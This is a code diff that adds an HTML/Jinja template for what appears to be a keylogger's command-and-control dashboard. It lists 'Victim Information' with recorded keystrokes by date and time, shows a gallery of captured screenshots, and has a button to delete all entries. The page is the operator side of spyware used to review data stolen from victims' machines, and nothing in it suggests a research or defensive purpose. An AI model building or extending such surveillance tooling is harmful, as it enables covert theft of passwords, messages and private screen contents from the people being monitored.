@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Dashboard</title>
+    <link
+      rel="stylesheet"
+      href="{{ url_for('static', filename='dashboard.css') }}"
+    />
+  </head>
+  <body>
+    <div>
+      <h1>Victim Information</h1>
+      <table border="1">
+        <tr>
+          <th>ID</th>
+          <th>Date</th>
+          <th>Time</th>
+          <th>keystrokes recorded</th>
+        </tr>
+        {% for keylog in keylogs %}
+        <tr>
+          <td>{{ keylog[0] }}</td>
+          <td>{{ keylog[1] }}</td>
+          <td>{{ keylog[2] }}</td>
+          <td>{{ keylog[3] }}</td>
+        </tr>
+        {% endfor %}
+      </table>
+      <span>Reload the page for updates.</span>
+
+      <a href="/">Logout</a>
+
+      <form
+        method="POST"
+        action="{{ url_for('delete_all') }}"
+        onsubmit="return confirm('Are you sure you want to delete all entries?');"
+      >
+        <button type="submit">Delete All Entries</button>
+      </form>
+    </div>
+    <div class="imgblock">
+      <h2>Captured Screenshots</h2>
+      <div class="image_holder" id="imageHolder">
+        {% for screenshot in screenshots %}
+        <div>
+          <img
+            src="{{ url_for('serve_screenshot', filename=screenshot) }}"
+            alt="{{ screenshot }}"
+            onclick="openImageFullscreen(this)"
+          />
+          <span>{{ screenshot }}</span>
+        </div>
+        {% endfor %}
+      </div>
+      
+    </div>
+    <script>
+      function openImageFullscreen(img) {
+        const fullscreenDiv = document.createElement("div");
+        fullscreenDiv.style.position = "fixed";
+        fullscreenDiv.style.top = "0";
+        // fullscreenDiv.style.left = "0";
+        fullscreenDiv.style.width = "100vw";
+        fullscreenDiv.style.height = "100vh";
+        fullscreenDiv.style.backgroundColor = "rgba(0, 0, 0, 0.9)";
+        fullscreenDiv.style.display = "flex";
+        fullscreenDiv.style.justifyContent = "center"; /* Center horizontally */
+        fullscreenDiv.style.alignItems = "center"; /* Center vertically */
+        fullscreenDiv.style.zIndex = "1000";
+    
+        const fullscreenImg = document.createElement("img");
+        fullscreenImg.src = img.src;
+        fullscreenImg.style.maxWidth = "90%";
+        fullscreenImg.style.maxHeight = "90%";
+        fullscreenImg.style.boxShadow = "0 4px 20px rgba(255, 255, 255, 0.5)";
+        fullscreenImg.style.borderRadius = "8px";
+    
+        fullscreenDiv.appendChild(fullscreenImg);
+    
+        // Close the full-screen view when clicking outside the image
+        fullscreenDiv.addEventListener("click", (e) => {
+          if (e.target === fullscreenDiv) {
+            document.body.removeChild(fullscreenDiv);
+          }
+        });
+    
+        document.body.appendChild(fullscreenDiv);
+      }
+    </script>
+        
+    
+  </body>
+</html>
